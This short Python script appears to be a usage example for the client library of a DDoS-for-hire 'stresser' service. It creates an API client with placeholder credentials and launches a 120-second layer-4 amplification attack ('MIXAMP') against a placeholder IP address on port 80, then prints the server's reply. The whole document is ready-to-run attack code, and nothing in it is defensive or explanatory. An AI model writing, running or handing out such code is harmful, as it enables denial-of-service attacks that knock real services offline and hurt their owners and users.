from doomstresser import DoomApi, L4Method

#Create key - https://doom-stresser.cc/api
doom = DoomApi("<user-id>", "<key>") 

response = doom.layer4.attack(
    target="X.X.X.X", # ip here
    port=80,
    method=L4Method.MIXAMP,
    duration=120
)

print(response) #text from server